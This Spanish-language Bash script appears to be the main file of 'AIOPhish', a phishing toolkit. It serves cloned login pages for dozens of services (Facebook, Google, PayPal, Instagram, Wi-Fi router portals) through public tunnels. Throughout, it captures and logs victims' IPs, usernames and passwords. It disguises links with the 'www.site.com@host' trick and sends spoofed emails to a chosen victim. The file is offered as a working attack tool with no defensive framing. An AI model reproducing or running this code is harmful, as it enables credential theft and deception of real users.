#coded by Eragon
source menu/pages.sh
source servidores/tunnel.sh
source utils/ip.sh
source core/meta.sh
source core/new_page.sh
source core/spoof.sh

trap 'printf "\n";stop;exit 1' 2
r="\e[1;91m"
v="\e[1;92m"
a="\e[1;93m"
b="\e[1;39m"
m="\e[1;96m"
z="\e[1;94m"
#rnd=`shuf -i 3000-10000 -n 1`
crnd=`shuf -i 1-9 -n 1`
DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
link="localhost:3333"
#brnd=`shuf -i 2-7 -n 1`
s="m"
bcolor="\e[1;3$crnd$s"
defaultport=8000

a2(){
    clear
echo "     _    ___ ___  ____  _     _     _     ";
echo "    / \  |_ _/ _ \|  _ \| |__ (_)___| |__  ";
echo "   / _ \  | | | | | |_) | '_ \| / __| '_ \ ";
echo "  / ___ \ | | |_| |  __/| | | | \__ \ | | |";
echo " /_/   \_\___\___/|_|   |_| |_|_|___/_| |_|";
echo -e "
  Social Toolkit for Phishing
     ${b}coded by DeepSociety

${b}< https://github.com/DeepSociety >
"
}

paquetes(){
        command -v php > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b PHP No instalado"; exit 1;}
        command -v curl > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Curl No instalado"; exit 1;}
        command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b GIT No instalado"; exit 1;}
}

#Detener procesos en segundo plano
stop() {
        checkng=$(ps aux | grep -o "ngrok" | head -n1)
        checkphp=$(ps aux | grep -o "php" | head -n1)
        if [[ $checkng == *'ngrok'* ]]; then
                pkill -f -2 ngrok > /dev/null 2>&1
                killall -2 ngrok > /dev/null 2>&1
        fi
        if [[ $checkphp == *'php'* ]]; then
                pkill -f -2 php > /dev/null 2>&1
                killall -2 php > /dev/null 2>&1
        fi
}

menu(){
      paquetes
echo -e $bcolor
a2
echo
echo -e "$a[$b 1$v ]$b Amazon             $a[$b 21$v ]$b PlayStation    $a[$b 41$v ]$b Fortnite"
echo -e "$a[$b 2$v ]$b Apple              $a[$b 22$v ]$b PrimeVideo     $a[$b 42$v ]$b FreeFire"
echo -e "$a[$b 3$v ]$b Badoo              $a[$b 23$v ]$b Protonmail     $a[$b 43$v ]$b ClashOfClans"
echo -e "$a[$b 4$v ]$b Deviantart         $a[$b 24$v ]$b Reddit         $a[$b 99$v ]$b Ayuda"
echo -e "$a[$b 5$v ]$b eBay               $a[$b 25$v ]$b Shopify        $a[$b 00$v ]$b Salir"
echo -e "$a[$b 6$v ]$b Facebook           $a[$b 26$v ]$b Snapchat"
echo -e "$a[$b 7$v ]$b Foursquare         $a[$b 27$v ]$b Spotify"
echo -e "$a[$b 8$v ]$b Github             $a[$b 28$v ]$b Steam"
echo -e "$a[$b 9$v ]$b Google             $a[$b 29$v ]$b Twitch"
echo -e "$a[$b 10$v ]$b iCloud            $a[$b 30$v ]$b Twitter"
echo -e "$a[$b 11$v ]$b Imgur             $a[$b 31$v ]$b Verizon"
echo -e "$a[$b 12$v ]$b InstaFollowers    $a[$b 32$v ]$b Vimeo"
echo -e "$a[$b 13$v ]$b Instagram         $a[$b 33$v ]$b VK"
echo -e "$a[$b 14$v ]$b Linkedin          $a[$b 34$v ]$b Wifi"
echo -e "$a[$b 15$v ]$b Microsoft         $a[$b 35$v ]$b WordPress"
echo -e "$a[$b 16$v ]$b MySpace           $a[$b 36$v ]$b Yahoo"
echo -e "$a[$b 17$v ]$b Netflix           $a[$b 37$v ]$b Yandex"
echo -e "$a[$b 18$v ]$b Origin            $a[$b 38$v ]$b Yelp"
echo -e "$a[$b 19$v ]$b Paypal            $a[$b 39$v ]$b Adobe"
echo -e "$a[$b 20$v ]$b Pinterest         $a[$b 40$v ]$b Pornhub"
}


finish() {
        echo -e "$v[$b*$v]$b AIOPhish by DeepSociety"
	echo -e "$v[$b*$v]$b https://github.com/DeepSociety"
	if [[ $clonada == "si" ]];then
		if [[ -f ngrok ]];then
			if [[ -f clonadas/index.html || -f clonadas/login.php ]];then
				rm clonadas/index.html
				rm clonadas/login.php
			fi
		else
			if [[ -f index.html || -f login.php ]];then
				rm index.html
				rm login.php
			fi
		fi
	fi


	#Si ngrok esta en el inicio significa que estamos en la carpeta principal
        if [[ -f ngrok ]];then
                if [[ -d $ruta_carpeta/images ]];then
                        rm -rf $ruta_carpeta/images
                fi
                if [[ -f $ruta_carpeta/alert.js ]];then
                        rm -rf $ruta_carpeta/alert.js
                fi
                if [[ -f $ruta_carpeta/email ]];then
                        rm $ruta_carpeta/email
                fi
                if [[ -f $ruta_carpeta/pr1 ]];then
                        rm $ruta_carpeta/pr1
                fi
                if [[ -f $ruta_carpeta/pr2 ]];then
                        rm $ruta_carpeta/pr2
                fi
                if [[ -f $ruta_carpeta/pr3 ]];then
                        rm $ruta_carpeta/pr3
                fi
                if [[ -f $ruta_carpeta/pr4 ]];then
                        rm $ruta_carpeta/pr4
                fi
                if [[ -f $ruta_carpeta/hola ]];then
                        rm $ruta_carpeta/hola
                fi
                if [[ -f $ruta_carpeta/victima ]];then
                        rm $ruta_carpeta/victima
                fi
                if [[ -f $ruta_carpeta/index.html ]];then
               		sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
                	sed -i "/<script src='alert.js'/d" ./$ruta_carpeta/index.html
		fi

        #Si no esta significa que estamos dentro de la pagina elegida
	else
                if [[ -d images ]];then
                        rm -rf images
                fi
                if [[ -f alert.js ]];then
                        rm -rf alert.js
                fi
                if [[ -f email ]];then
                        rm email
                fi
                if [[ -f hola ]];then
                        rm hola
                fi
                if [[ -f pr1 ]];then
                        rm pr1
                fi
                if [[ -f pr2 ]];then
                        rm pr2
                fi
                if [[ -f pr3 ]];then
                        rm pr3
                fi
                if [[ -f pr4 ]];then
                        rm pr4
                fi
                if [[ -f victima ]];then
                        rm victima
                fi
		if [[ -f index.html ]];then
                	sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
                	sed -i "/<script src='alert.js'/d" ./index.html
		fi
	fi
}

menu_principal(){
    a2
    echo -e "$v[$b 1$v ] Clonar una pagina"
    echo -e "$v[$b 2$v ] Elegir platilla\n"
    echo -e "$v[$b 3$v ] Abrir administrador\n"
    read -p $'\e[1;32mroot@STP/\e[1;39m ' opc_principal
    if [[ $opc_principal == "1" || $opc_principal == "01" ]];then
        menu_nueva_pagina
    elif [[ $opc_principal == "2" || $opc_principal == "02" ]];then
        options
    elif [[ $opc_principal == "3" || $opc_principal == "03" ]];then
        echo -e "\n$v[$b*$v]$b Si notas algún error en la consola, ignóralo el servidor seguirá funcionando\n"
        cd eragonprojects && python3 manage.py runserver $defaultport
    else
        echo -e "$r[!]$b Opción invalida"
        sleep 1
        menu_principal
    fi
}

options(){
menu

read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Elige una opción\e[1;39m > ' opc

check_page

}

#Instalar ngrok
findngrok(){
        if [[ ! -f ngrok ]];then
                ar=$(uname -a | grep -o 'arm' | head -n1)
                ar2=$(uname -a | grep -o 'Android' | head -n1)
                if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
                        echo -e "$v[*]$b Instalando ngrok..."
                        git clone https://github.com/DeepSociety/best-ngrok
                        mv best-ngrok/ngrok $PWD

                if [[ -d best-ngrok ]];then
                        rm -rf best-ngrok
                else
                        echo -e "$r[!]$b Comprueba tu conexión."
                        exit 1
                fi

        else
                echo -e "$v[*]$b Instalando ngrok..."
                wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

                if [[ -e ngrok-stable-linux-386.zip ]]; then
                        unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                        chmod +x ngrok
                        rm -rf ngrok-stable-linux-386.zip
                else
                echo -e "$r[!]$b Comprueba tu conexión."
                exit 1
                fi

                fi

        fi
}

#Elegir el tunnel
tunnel(){
        echo -e $bcolor
        a2
        echo -e "$v[$b*$v] Pagina:$b $web"
	if [[ $clonada == "" ]];then
		echo -e "$v[$b*$v] Idioma:$b $op"
	fi
        echo -e "$v[$b*$v]$b Selecciona el tunnel:\n"
        echo -e "$a[$b 1$v ] Localhost.run"
        echo -e "$a[$b 2$v ] Serveo"
        echo -e "$a[$b 3$v ] Ngrok"
        echo -e "$a[$b 4$v ] Localhost\n"

        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' tunnel
        if [[ $tunnel == "1" || $tunnel == "01" ]];then
                cd $ruta_carpeta
                tunnel2="localrun"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        elif [[ $tunnel == "2" || $tunnel == "02" ]];then
                cd $ruta_carpeta
                tunnel2="serveo"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        elif [[ $tunnel == "3" || $tunnel == "03" ]];then
                cd $ruta_carpeta
                tunnel2="ngrok"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        elif [[ $tunnel == "4" || $tunnel == "04" ]];then
                cd $ruta_carpeta
                tunnel2="localhost"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        else
                echo -e "\n$r[*]$b Opción invalida: $tunnel\n"
                sleep 0.5
                tunnel
        fi
}

list_fb(){
        clear
        echo -e $bcolor
        a2
        echo -e "
$v[$b*$v] Pagina:$b Facebook\n
$a[$b 1 $v] Facebook Old Page
$a[$b 2$v ] Facebook mensaje
$a[$b 3$v ] Facebook Seguridad
$a[$b 4$v ] Facebook New Page
$a[$b 99$v ] Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcfb
        if [[ $opcfb == "1" || $opcfb == "01" ]];then
                web="facebook"
                go
        elif [[ $opcfb == "2" || $opcfb == "02" ]];then
                web="mobile.facebook"
                go
        elif [[ $opcfb == "3" || $opcfb == "03" ]];then
                web="alertadeseguridad"
                go
        elif [[ $opcfb == "4" || $opcfb == "04" ]];then
                web="messenger"
                go
        elif [[ $opcfb == "99" ]];then
                options
        else
                echo -e "\n$r[!]$b Opción invalida\n"
                sleep 1
                list_fb
        fi
}

list_insta(){
        clear
        echo -e $bcolor
        a2
        echo -e "
$v[$b*$v] Pagina:$b Instagram\n
$a[$b 1$v ] Pagina oficial
$a[$b 2$v ] Instagram likes
$a[$b 3$v ] Instagram avanzado
$a[$b 99$v ] Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcin
        if [[ $opcin == "1" || $opcin == "01" ]];then
                web="instagram"
                go
        elif [[ $opcin == "2" || $opcin == "02" ]];then
                web="autoinsta"
                op="ingles"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcin == "3" || $opcin == "03" ]];then
                web="mobile.instagram"
                adv_insta
        elif [[ $opcin == "99" ]];then
                options
        else
                echo -e "\n$r[!]$b Opción invalida\n"
                sleep 1
                list_insta
        fi
}

adv_insta(){
        clear
        echo -e $bcolor
        a2
        echo -e "$v[$b*$v]$b Selecciona las fotos que se mostraran:\n
$a[$b 1$v ] MiaKhalifa
$a[$b 2$v ] Justin Biber\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' sex
        if [[ $sex == "1" || $sex == "01" ]];then
                adv="xd"
                sexo="miak"
                go
        elif [[ $sex == "2" || $sex == "02" ]];then
                adv="xd"
                sexo="man"
                go
        else
        echo -e "$r[!]$b Opción invalida"
                sleep 1
                adv_insta
        fi
}

list_goo(){
        clear
        echo -e $bcolor
        a2
        echo -e "
$v[$b*$v] Pagina:$b Google\n
$a[$b 1$v ] Pagina 1
$a[$b 2$v ] Pagina 2
$a[$b 3$v ] Pagina avanzada
$a[$b 99$v ] Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcgo
        if [[ $opcgo == "1" || $opcgo == "01" ]];then
                web="google"
                go
        elif [[ $opcgo == "2" || $opcgo == "02" ]];then
                web="mobile.google"
                go
        elif [[ $opcgo == "3" || $opcgo == "03" ]];then
                web="sign.google"
                go
        elif [[ $opcgo == "99" ]];then
                options
        else
                echo -e "\n$r[!]$b Opción invalida\n"
                sleep 1
                list_goo
        fi
}

list_wifi(){
        clear
        echo -e $bcolor
        a2
        echo -e "
$v[$b*$v] Pagina:$b Wifi\n
$a[$b 1$v ] Claro wifi
$a[$b 2$v ] Directv wifi
$a[$b 3$v ] GoogleWlan
$a[$b 4$v ] Movistar
$a[$b 5$v ] Telekom
$a[$b 6$v ] Telmex
$a[$b 7$v ] Tigo
$a[$b 8$v ] Tp-link
$a[$b 9$v ] HuaweiCnt
$a[$b 99$v ] Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcwi
        if [[ $opcwi == "1" || $opcwi == "01" ]];then
                web="claro"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "2" || $opcwi == "02" ]];then
                web="directv"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "3" || $opcwi == "03" ]];then
                web="googlewlan"
                ruta_carpeta="websites/$web"
                echo
                op="ingles"
                tunnel
        elif [[ $opcwi == "4" || $opcwi == "04" ]];then
                web="movistar"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "5" || $opcwi == "05" ]];then
                web="telekom"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "6" || $opcwi == "06" ]];then
                web="telmex"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "7" || $opcwi == "07" ]];then
                web="tigo"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "8" || $opcwi == "08" ]];then
                web="tplink"
                op="ingles"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "9" || $opcwi == "09" ]];then
                web="huawei"
                ruta_carpeta="websites/$web"
                echo
                tunnel
        elif [[ $opcwi == "99" ]];then
                options
        else
                echo -e "\n$r[!]$b Opción invalida\n"
                sleep 1
                list_wifi
        fi
}

go(){
        echo -e $bcolor
        a2
        echo -e "$v[$b*$v] Pagina:$b $web"
        echo -e "$v[$b*$v]$b Selecciona el idioma de la pagina:\n"
        echo -e "$a[$b 1$v ]$v Español"
        echo -e "$a[$b 2$v ]$v English"
        echo -e "$a[$b 99$v ]$v Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' lg
        echo
        if [[ $lg == "1" || $lg == "01" ]];then
                op="español"
                idioma="es"

        if [[ $adv == "xd" ]];then
                ruta_carpeta="websites/$web/es/$sexo"
        else
                ruta_carpeta="websites/$web/es"
        fi
                echo
                tunnel

        elif [[ $lg == "2" || $lg == "02" ]];then
                op="english"
                idioma="us"

        if [[ $adv == "xd" ]];then
                ruta_carpeta="websites/$web/us/$sexo"

        else
                ruta_carpeta="websites/$web/us"
        fi
                echo
                tunnel

        elif [[ $lg == "99" ]];then
                options

        else
                echo -e "$r[*]$b Opción invalida: $lg"
                sleep 0.5
                go
        fi
}


disfraz(){
	if [[ $clonada != "si" ]];then
        	namee=$(echo "$envialink" | cut -d "/" -f3)
        	pop9="https://www.$web.com@$namee"
	fi
}

check_found(){
        echo -e "\n$r[$b*$r]$b Esperando Datos$r [$b*$r]"
        echo -e $v
        while true;do
                if [[ -f foundip.txt ]];then
                        sed -i '3iIP Encontrada: '"$HORA"' '"$DIA"'' foundip.txt
                        echo
                        echo -e "$v[*]$a IP Encontrada!!"
                        found_ip
                        rm foundip.txt
                        sleep 0.5
                fi

                if [[ -f founduser.txt ]];then
                        if [[ $clonada == "si" ]];then
                                sed -i '1iDatos Encontrados: '"$HORA"' '"$DIA"'\n' founduser.txt
                                echo -e "$v[*]$a Datos Encontrados!!"
                                found_user
                                rm founduser.txt
                        else
                                sed -i '3iDatos Encontrados: '"$HORA"' '"$DIA"'' founduser.txt
                                echo -e "$v[*]$a Datos Encontrados!!"
                                found_user
                                rm founduser.txt
                       fi
                fi
                sleep 0.5
        done

}

found_ip(){
        ip=$(grep -a 'IP:' foundip.txt | cut -d " " -f2 | tr -d '\r')
        agent=$(grep 'User-Agent:.*' foundip.txt | cut -d ':' -f2)
        if [[ $clonada == "si" ]];then
                saved_to="${a}IP Guardados:$b clonadas/ip.txt"
        else
                saved_to="${a}IP Guardados:$b websites/$web/ip.txt"
        fi

        echo -e "$a[*]$v IP:$b " $ip
        echo -e  "\n$a[*]$v User-Agent:$b $agent\n"
        echo -e $saved_to
        if [[ -d ../es || -d ../us ]];then
                cat foundip.txt >> ../ip.txt
        else
                cat foundip.txt >> ip.txt
        fi
        echo
        dates_ip
        echo -e "\n$v[$b*$v]$b Esperando proximos datos$v [$b*$v]\n"
}

found_user(){
        echo "$web" >> $OLDPWD/modules/pages
        account=$(grep -o 'Username:.*' founduser.txt | cut -d " " -f2)
        password=$(grep -o 'Password:.*' founduser.txt | cut -d ":" -f2)
	if [[ $clonada == "si" ]];then
		saved_to="${a}Datos Guardados:$b clonadas/account.txt"
	else
        	saved_to="${a}Datos Guardados:$b websites/$web/account.txt"
	fi
        if [[ $clonada == "si" ]];then
                echo -e "$b"
                cat founduser.txt
                echo -e "\n$saved_to"
        else
                echo -e "$a[*]$v Usuario:$b" $account
                echo -e "$a[*]$v Contraseña:$b" $password
                echo -e "\n$saved_to"
        fi
        if [[ -d ../es || -d ../us ]];then
                echo "Username: $account Password: $password" >> ../.cuenta
                cat founduser.txt >> ../account.txt
        else
                echo "Username: $account Password: $password" >> .cuenta
                cat founduser.txt >> account.txt
        fi
        echo "Datos encontrados de - $web" >> $OLDPWD/modules/accounts.txt
        cat founduser.txt >> $OLDPWD/modules/accounts.txt
        echo -e "\n$v[$b*$v]$b Esperando proximos datos$v [$b*$v]\n"
}


#Elimina los elementos que han sido añadidos anteriormente

clear_meta(){
        if [[ -f link ]];then
                rm link
        fi

        if [[ -d images ]];then
                rm -rf images
        fi

        if [[ -f alert.js ]];then
                rm alert.js
        fi

        if [[ -f infoip ]];then
                rm infoip
        fi

        sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
        sed -i "/<script src='alert.js'/d" ./index.html
}

menu_options(){
        echo -e $bcolor
        a2
        echo -e "$v[$b*$v] Pagina:$b $web"
	if [[ $clonada == "" ]];then
	        echo -e "$v[$b*$v] Idioma:$b $op"
	fi
        echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
        menu_agregados
        echo -e "$v[$b*$v]$b Mas opciones:\n"
        echo -e "$a[$b 1$v ] Mostrar titulo"
        echo -e "$a[$b 2$v ] Mostrar imagen"
        echo -e "$a[$b 3$v ] Mostrar descripción"
        echo -e "$a[$b 4$v ] Mostrar una mini url"
        echo -e "$a[$b 5$v ] Mostrar alert box(Puede causar errores)"
        echo -e "$a[$b 6$v ] Redireccionar"
        echo -e "$a[$b 7$v ] Enviar correo falso\n"
        echo -e "$a[$b*$v]$b Para enpezar:\n"
        echo -e "$v[$b*$v]$b Escribe run o start.\n"
}

add_option(){
        menu_options
        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' addopc
        if [[ $addopc == "1" || $addopc == "01" ]];then
                clear
                echo -e $bcolor
                a2
                read -p $'\e[1;33m[*]\e[1;32m Escribe el titulo\e[1;39m > ' title
        if [[ $title == "" ]];then
                echo -e "\n$r[!]$b No escribiste el titulo"
                sleep 1
                add_option
        else
                add1="tt"
                add_option
        fi

        elif [[ $addopc == "2" || $addopc == "02" ]];then
                clear
                echo -e $bcolor
                a2
                read -p $'\e[1;33m[*]\e[1;32m Escribe la ruta de la imagen\e[1;39m > ' ruta
        if [[ $ruta == "" ]];then
                echo -e "\n$r[!]$b No escribiste la ruta"
                sleep 1
                add_option
        else
        if [[ -f $ruta ]];then
                add2="2"
                add_option
        else
                echo -e "\n$r[!]$b La imagen no existe"
                sleep 1
                add_option
        fi
        fi

        elif [[ $addopc == "3" || $addopc == "03" ]];then
                clear
                echo -e $bcolor
                a2
                read -p $'\e[1;33m[*]\e[1;32m Escribe la descripción\e[1;39m > ' text
        if [[ $text == "" ]];then
                echo -e "\n$r[!]$b No escribiste la descripción"
                sleep 1
                add_option
        else
                add3="3"
                add_option
        fi

        elif [[ $addopc == "4" || $addopc == "04" ]];then
                clear
                echo -e $bcolor
                a2
                read -p $'\e[1;33m[*]\e[1;32m Escribe la url(sin:http/https)\e[1;39m> ' url2
        if [[ $url2 == "" ]];then
                echo -e "\n$r[!]$b No escribiste la url"
                sleep 1
                add_option
        else
                add4="4"
                add_option
        fi

        elif [[ $addopc == "5" || $addopc == "05" ]];then
                clear
                echo -e $bcolor
                a2
                read -p $'\e[1;33m[*]\e[1;32m Escribe el mensaje de alerta\e[1;39m > ' alert
        if [[ $alert == "" ]];then
                echo -e "\n$r[!]$b No escribiste el mensaje"
                sleep 1
                add_option
                else
                add5="5"
                add_option
        fi

        elif [[ $addopc == "6" || $addopc == "06" ]];then
                clear
                echo -e $bcolor
                a2
                add6="6"
		read -p $'\e[1;33m[*]\e[1;32m Escribe la url a redireccionar(Usa: http/https)\e[1;39m > ' rede
 		add_option

        elif [[ $addopc == "7" || $addopc == "07" ]];then
                clear
                echo -e $bcolor
                a2
                echo -e "$v[$b*$v]$b Asegurate de tener la sincronización desactivada, y una buena conexión a internet"
                echo -e "$v[$b*$v]$b Completa el siguiente formulario:\n"
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Destinatario?(victima): ' victim
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Quien lo envia?(ejem:Facebook): ' send
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Asunto(tema): ' tema
                echo -e "$v[$b*$v]$b Tu correo, este no se mostrara en el correo falso enviado ¿Pero porque es importante? Pues si ya has enviado correos a la victima, el correo falso enviado se mostrara en la lista principal, si colocas un correo que no existe(puedes hacerlo) el correo falso enviado puede aparecer en la lista de Spam"
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe tu correo: ' correo
        if [[ $victim == "" || $send == "" || $tema == "" ]];then
                echo -e "$r[!]$b No completaste algunos campos:("
                sleep 1
                menu_options
                add_option
        else
        if [[ $correo == "" ]];then
                correo="correofake@gmail.com"
        fi
        
        echo -e "\n$a[$b 1$v ]$b Mensaje establecido
$a[$b 2$v ]$b Personalizar mensaje
$a[$b 99$v ]$b Volver al menú\n"
       
        while true;do
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcspof

                if [[ $opcspof == "1" || $opcspof == "01" ]];then
                        establecido="si"
                        add7="7"
                        echo -e "$v[$b*$v]$b Listo, el email se enviara al iniciar"
                        sleep 1
                        menu_options
                        add_option

                elif [[ $opcspof == "2" || $opcspof == "02" ]];then
                        echo -e "$v[$b*$v]$b Debes tener conocimientos de html, css para poder estructurar, dar estilo al mensaje, tienes que armar el mensaje en una sola linea, los saltos de linea se daran automaticamente al poner una etiqueta.\n"
                        read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Deseeas continuar(y/n): ' deseo

                if [[ $deseo == "y" || $deseo == "Y" ]];then
                        add7="7"
                        read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe el mensaje > ' msj
                        echo -e "$v[$b*$v]$b Listo; el email se enviara al generar el link"
                        sleep 1
                        menu_options
                        add_option
                else
                        menu_options
                        add_option
                fi

                elif [[ $opcspof == "99" ]];then
                        menu_options
                        add_option

                else
                        echo -e "$r[!]$b Opción invalida"
                        sleep 1
                fi

        done

        fi

        elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "start" || $addopc == "Start" ]];then
                clear
                echo -e $bcolor
                a2
                echo -e "$v[$b*$v] Pagina:$b $web"
		if [[ $clonada == "" ]];then
                	echo -e "$v[$b*$v] Idioma:$b $op"
                fi
		echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
                menu_agregados
                echo -e "$v[$b*$v] Puedes enviar un email falso:"
                echo -e "$v[$b*$v]$b https://emailspoofbyharris.000webhostapp.com"
                $tunnel2
        else
                echo -e "\n$r[!]$b Opción invalida > $addopc"
                sleep 1
                add_option
        fi
}

#Muestra las opciones que han sido añadidas
menu_agregados(){
        if [[ $add1 == "tt" ]];then
                echo -e "$v[$b*$v] Titulo:$b $title"
        fi
        if [[ $add2 == "2" ]];then
                second_img=$(basename $ruta)
                echo -e "$v[$b*$v] Imagen:$b $second_img"
        fi
        if [[ $add3 == "3" ]];then
                echo -e "$v[$b*$v] Descripción:$b $text"
        fi
        if [[ $add4 == "4" ]];then
                echo -e "$v[$b*$v] Mini url:$b $url2"
        fi
        if [[ $add5 == "5" ]];then
                echo -e "$v[$b*$v] AlertBox:$b $alert"
        fi
        if [[ $add6 == "6" ]];then
                echo -e "$v[$b*$v] Redireccionar:$b $rede"
        fi
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v] Enviar email a:$b $victim"
        fi
}

#Verifica que opciones han sido escogidas para despues añadirlas
check(){
        if [[ $add1 == "tt" ]];then
                show_title
        fi
        if [[ $add2 == "2" ]];then
                show_photo
        fi
        if [[ $add3 == "3" ]];then
                show_text
        fi
        if [[ $add4 == "4" ]];then
                show_url
        fi
        if [[ $add5 == "5" ]];then
                add_alert_box
        fi
        if [[ $add6 == "6" ]];then
                change_page
        fi
        if [[ $add7 == "7" ]];then
                send_msj
        fi
}


#PRONTO:D

#if [[ $1 != "" ]];then
#        if [[ $1 == "--add-template" ]];then
#                if [[ $2 != "" ]];then
#                        template_ruta=$2
#                else
#                        echo "[*] Debes colocar la ruta de la plantilla
#--add-template [ruta]

#[*] Ejemplo:
#        --add-template /sdcard/Download/plantilla
#                        "
#                fi
#        fi
#fi

#if [[ $1 != "" ]];then
#        if [[ $1 == "--view-accounts" ]];then
#                usa=$(grep -o 'Username:.*' modules/accounts.txt)
#                echo "$usa"
#        fi
#fi
if [[ $1 != "" ]];then
        if [[ $1 == "--run-admin" ]];then
                
                if [[ $2 != "" ]];then
                        defaultport=$2
                fi
                cd eragonprojects && python3 manage.py runserver $defaultport
        fi
fi

if [[ $1 == "" ]];then
    menu_principal
fi
